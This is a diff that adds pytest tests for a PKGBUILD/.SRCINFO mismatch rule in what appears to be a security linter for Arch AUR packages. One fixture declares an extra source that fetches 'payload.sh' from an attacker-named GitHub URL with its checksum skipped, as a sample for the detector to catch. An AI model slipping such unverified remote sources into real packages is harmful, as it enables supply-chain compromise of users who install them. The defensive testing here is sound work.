@@ -1,11 +1,19 @@
 from __future__ import annotations
 
+from aurmanager.parser.pkgbuild import parse_pkgbuild
 from aurmanager.rules.integrity import (
     INT001PkgverNetworkCall,
     INT002SuspiciousSourceHost,
     INT003SkippedChecksumOnNetworkSource,
     INT005InstallHookPullsUnpinnedDeps,
+    INT006SrcinfoPkgbuildMismatch,
 )
+
+
+def _make_ctx_with_srcinfo(tmp_path, pkgbuild_body, srcinfo_body):
+    (tmp_path / "PKGBUILD").write_text(pkgbuild_body)
+    (tmp_path / ".SRCINFO").write_text(srcinfo_body)
+    return parse_pkgbuild(tmp_path / "PKGBUILD")
 
 
 def test_int001_fires_on_git_ls_remote(make_pkgbuild_ctx):
@@ -287,3 +295,116 @@ def test_int005_flag_value_not_mistaken_for_unpinned_package(make_install_ctx):
     assert len(findings) == 1
     assert "unpinned" not in findings[0].message
     assert "pins a specific version" in findings[0].message
+
+
+def test_int006_does_not_fire_when_pkgbuild_and_srcinfo_are_consistent(tmp_path):
+    ctx = _make_ctx_with_srcinfo(
+        tmp_path,
+        pkgbuild_body="""
+        pkgname=foo
+        pkgver=1.0
+        source=("https://example.com/foo.tar.gz")
+        sha256sums=('deadbeef')
+        """,
+        srcinfo_body="""pkgbase = foo
+	pkgver = 1.0
+	source = foo.tar.gz::https://example.com/foo.tar.gz
+	sha256sums = deadbeef
+
+pkgname = foo
+""",
+    )
+    assert list(INT006SrcinfoPkgbuildMismatch().check(ctx)) == []
+
+
+def test_int006_does_not_fire_when_no_srcinfo_present(make_pkgbuild_ctx):
+    # make_pkgbuild_ctx only writes a PKGBUILD, no .SRCINFO -- absence alone
+    # is not itself a finding (e.g. a bare snapshot tarball, not a git clone).
+    ctx = make_pkgbuild_ctx(
+        """
+        pkgname=foo
+        pkgver=1.0
+        source=("https://example.com/foo.tar.gz")
+        sha256sums=('deadbeef')
+        """
+    )
+    assert list(INT006SrcinfoPkgbuildMismatch().check(ctx)) == []
+
+
+def test_int006_fires_on_checksum_mismatch(tmp_path):
+    # Regression scenario verified live against a real `makepkg --printsrcinfo`
+    # output: a checksum edited in PKGBUILD after .SRCINFO was generated.
+    ctx = _make_ctx_with_srcinfo(
+        tmp_path,
+        pkgbuild_body="""
+        pkgname=foo
+        pkgver=1.0
+        source=("https://example.com/foo.tar.gz")
+        sha256sums=('attackerattackerattackerattacker')
+        """,
+        srcinfo_body="""pkgbase = foo
+	pkgver = 1.0
+	source = foo.tar.gz::https://example.com/foo.tar.gz
+	sha256sums = deadbeef
+
+pkgname = foo
+""",
+    )
+    findings = list(INT006SrcinfoPkgbuildMismatch().check(ctx))
+    assert len(findings) == 1
+    assert "sha256sums" in findings[0].message
+
+
+def test_int006_fires_on_source_count_mismatch(tmp_path):
+    # A source added to PKGBUILD without regenerating .SRCINFO -- the metadata
+    # a reviewer sees (.SRCINFO) no longer reflects what the script declares.
+    ctx = _make_ctx_with_srcinfo(
+        tmp_path,
+        pkgbuild_body="""
+        pkgname=foo
+        pkgver=1.0
+        source=("https://example.com/foo.tar.gz" "payload::https://raw.githubusercontent.com/attacker/x/main/payload.sh")
+        sha256sums=('deadbeef' 'SKIP')
+        """,
+        srcinfo_body="""pkgbase = foo
+	pkgver = 1.0
+	source = foo.tar.gz::https://example.com/foo.tar.gz
+	sha256sums = deadbeef
+
+pkgname = foo
+""",
+    )
+    findings = list(INT006SrcinfoPkgbuildMismatch().check(ctx))
+    messages = [f.message for f in findings]
+    assert any("declares 2 source(s)" in m for m in messages)
+
+
+def test_int006_does_not_fire_on_consistent_multi_arch_package(tmp_path):
+    # Regression: without merging arch-specific arrays (source_x86_64=(), ...)
+    # into ctx.sources, this would false-positive on every legitimate
+    # multi-arch package, since .SRCINFO always reports the fully-merged
+    # count. Verified live against real `makepkg --printsrcinfo` output.
+    ctx = _make_ctx_with_srcinfo(
+        tmp_path,
+        pkgbuild_body="""
+        pkgname=foo
+        pkgver=1.0
+        arch=('x86_64' 'aarch64')
+        source=("https://example.com/foo.tar.gz")
+        sha256sums=('deadbeef')
+        source_x86_64=("https://example.com/extra-x86_64.tar.gz")
+        sha256sums_x86_64=('cafebabe')
+        """,
+        srcinfo_body="""pkgbase = foo
+	pkgver = 1.0
+	arch = x86_64
+	arch = aarch64
+	source = foo.tar.gz::https://example.com/foo.tar.gz
+	sha256sums = deadbeef
+	source_x86_64 = https://example.com/extra-x86_64.tar.gz
+	sha256sums_x86_64 = cafebabe
+
+pkgname = foo
+""",
+    )
+    assert list(INT006SrcinfoPkgbuildMismatch().check(ctx)) == []
